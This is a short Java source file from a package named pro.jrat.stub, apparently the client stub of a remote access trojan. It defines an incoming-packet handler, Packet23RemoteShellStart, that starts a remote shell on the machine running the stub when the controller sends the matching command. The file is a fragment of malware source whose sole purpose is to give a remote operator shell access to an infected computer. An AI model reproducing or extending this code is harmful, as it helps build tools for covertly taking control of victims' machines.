package pro.jrat.stub.packets.incoming;

import pro.jrat.stub.RemoteShell;

public class Packet23RemoteShellStart extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		new RemoteShell().start();
	}

}
